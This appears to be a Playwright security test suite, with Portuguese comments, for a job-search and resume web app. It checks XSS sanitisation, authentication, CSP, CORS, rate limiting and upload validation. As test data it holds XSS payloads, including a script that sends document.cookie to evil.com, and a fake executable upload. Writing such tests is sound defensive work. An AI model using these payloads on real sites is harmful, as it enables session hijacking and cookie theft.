import { test, expect } from '@playwright/test';

/**
 * Security Tests — XSS Prevention
 * Tests for FR-03: XSS in dangerouslySetInnerHTML
 */
test.describe('Security: XSS Prevention', () => {

  /**
   * Test: XSS via job title/description from Adzuna API
   * FR-03: dados da API Adzuna renderizados sem sanitização
   */
  test('should sanitize XSS in job listings', async ({ page }) => {
    await page.goto('/jobs');

    // Intercepta a resposta da API para injetar XSS
    await page.route('**/api/jobs**', async (route) => {
      const response = await route.fetch();
      const json = await response.json();

      // Simula resposta com XSS
      const maliciousJob = {
        id: 'xss-test-1',
        title: '<img src=x onerror=alert("XSS")>Hacker Job</img>',
        description: '<script>document.location="https://evil.com?c="+document.cookie</script><p>Real job desc</p>',
        redirect_url: 'https://example.com/job',
        company: { display_name: 'Evil Corp' },
        location: { display_name: 'Remote' },
        created: new Date().toISOString(),
      };

      // Injeta no array de resultados
      if (json.results) {
        json.results.unshift(maliciousJob);
      }

      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(json),
      });
    });

    await page.waitForTimeout(500);

    // Executa JavaScript para detectar XSS
    const xssDetected = await page.evaluate(() => {
      // Procura elementos com script tags ou event handlers
      const scripts = document.querySelectorAll('script');
      const imgWithOnerror = document.querySelectorAll('img[onerror]');
      return scripts.length > 0 || imgWithOnerror.length > 0;
    });

    // XSS NÃO deve estar presente
    expect(xssDetected).toBe(false);
  });

  /**
   * Test: XSS via URL parameters
   */
  test('should not reflect XSS in URL params on jobs page', async ({ page }) => {
    const xssPayload = '<img src=x onerror=alert(1)>';

    await page.goto(`/jobs?q=${encodeURIComponent(xssPayload)}`);

    // Verifica que não há script execution
    const xssExecuted = await page.evaluate(() => {
      return (window as any).alerts && (window as any).alerts.length > 0;
    });

    expect(xssExecuted).toBe(false);
  });

  /**
   * Test: DOMPurify should be installed and used
   */
  test('should have DOMPurify available for sanitization', async ({ page }) => {
    await page.goto('/');

    // Verifica se DOMPurify está disponível no bundle
    const hasDOMPurify = await page.evaluate(() => {
      return typeof (window as any).DOMPurify !== 'undefined' ||
             document.querySelector('script[src*="dompurify"]') !== null;
    });

    // Se DOMPurify não está, alertar
    if (!hasDOMPurify) {
      console.warn('⚠️ DOMPurify não está instalado — XSS protection é responsabilidade do dev');
    }
  });
});

/**
 * Security Tests — Authentication & Authorization
 */
test.describe('Security: Authentication & Authorization', () => {

  /**
   * Test: Unauthenticated access to protected routes
   */
  test('should reject unauthenticated requests to dashboard', async ({ page }) => {
    await page.goto('/dashboard');

    // Deve redirecionar para login OU mostrar erro 401
    // Não deve mostrar conteúdo do dashboard
    await page.waitForURL(/\/(login|sign-in|register|sign-up|\?error)/);

    const dashboardContent = await page.locator('text=Dashboard').count();
    expect(dashboardContent).toBe(0);
  });

  /**
   * Test: API routes require authentication
   */
  test('should reject unauthenticated API requests', async ({ request }) => {
    const protectedEndpoints = [
      '/api/resumes',
      '/api/linkedin/audit',
      '/api/user/settings',
    ];

    for (const endpoint of protectedEndpoints) {
      const response = await request.get(endpoint);
      expect([401, 403]).toContain(response.status());
    }
  });

  /**
   * Test: Cannot access another user\'s resume
   */
  test('should not allow access to other user resumes', async ({ page }) => {
    // Login como usuário A
    await page.goto('/login');
    // ... setup login user A ...

    // Tenta acessar endpoint com ID de outro usuário
    const response = await page.request.get('/api/resumes/non-existent-id-123');

    // Deve retornar 401 ou 404, nunca 200 com dados
    expect([401, 403, 404]).toContain(response.status());
  });
});

/**
 * Security Tests — CSP Configuration
 */
test.describe('Security: Content Security Policy', () => {

  test('should have CSP headers configured', async ({ request }) => {
    const response = await request.get('/');

    const csp = response.headers()['content-security-policy'];
    const cspReportOnly = response.headers()['content-security-policy-report-only'];

    // Pelo menos um dos dois deve existir
    const hasCSP = csp || cspReportOnly;

    if (!hasCSP) {
      console.warn('⚠️ CSP não está configurado — FR-04');
    }

    expect(hasCSP).toBeTruthy();
  });

  test('CSP should not allow unsafe-inline for scripts', async ({ request }) => {
    const response = await request.get('/');
    const csp = response.headers()['content-security-policy'];

    if (csp) {
      // 'unsafe-inline' não deve estar em script-src
      const scriptSrcMatch = csp.match(/script-src[^;]*;/i);
      if (scriptSrcMatch) {
        const hasUnsafeInline = scriptSrcMatch[0].includes("'unsafe-inline'");
        expect(hasUnsafeInline).toBe(false);
      }
    }
  });

  test('CSP should not allow unsafe-eval', async ({ request }) => {
    const response = await request.get('/');
    const csp = response.headers()['content-security-policy'];

    if (csp) {
      const hasUnsafeEval = csp.includes("'unsafe-eval'");
      expect(hasUnsafeEval).toBe(false);
    }
  });
});

/**
 * Security Tests — CORS Configuration
 */
test.describe('Security: CORS Configuration', () => {

  test('API routes should not allow * origin', async ({ request }) => {
    const response = await request.get('/api/health', {
      headers: {
        'Origin': 'https://evil.com',
      },
    });

    const corsOrigin = response.headers()['access-control-allow-origin'];

    // Origin deve ser específico, não *
    expect(corsOrigin).not.toBe('*');

    // Para rotas autenticadas, pode ser null ou específico
    if (corsOrigin === '*') {
      console.warn('⚠️ CORS permite qualquer origem em /api — FR-05');
    }
  });
});

/**
 * Security Tests — Rate Limiting
 */
test.describe('Security: Rate Limiting', () => {

  test('should implement rate limiting on AI endpoints', async ({ request }) => {
    // Tenta fazer múltiplas requisições
    const requests = [];
    for (let i = 0; i < 15; i++) {
      requests.push(
        request.post('/api/resumes/test-id/analyze', {
          data: {},
        }).catch(() => ({ status: () => 0 }))
      );
    }

    const responses = await Promise.all(requests);
    const statuses = responses.map(r => r.status());

    // Pelo menos uma deve ser 429 (Too Many Requests)
    const hasRateLimit = statuses.some(s => s === 429);

    if (!hasRateLimit) {
      console.warn('⚠️ Rate limiting não implementado — FR-06');
    }
  });
});

/**
 * Security Tests — Input Validation
 */
test.describe('Security: Input Validation', () => {

  test('should reject oversized input in job search', async ({ page }) => {
    const longQuery = 'x'.repeat(10000);

    await page.goto(`/jobs?q=${encodeURIComponent(longQuery)}`);

    // Deve rejeitar ou truncar, não causar erro 500
    // O servidor deve validar o tamanho
  });

  test('should validate content-type for file uploads', async ({ request }) => {
    // Tenta fazer upload com Content-Type falsificado
    const response = await request.post('/api/resumes/import', {
      multipart: {
        file: {
          name: 'malicious.exe',
          mimeType: 'application/x-msdownload',
          buffer: Buffer.from('MZ...' /* PE header */),
        },
      },
      headers: {
        'Content-Type': 'application/x-msdownload',
      },
    });

    // Deve rejeitar (400 ou 415)
    expect([400, 415]).toContain(response.status());
  });
});
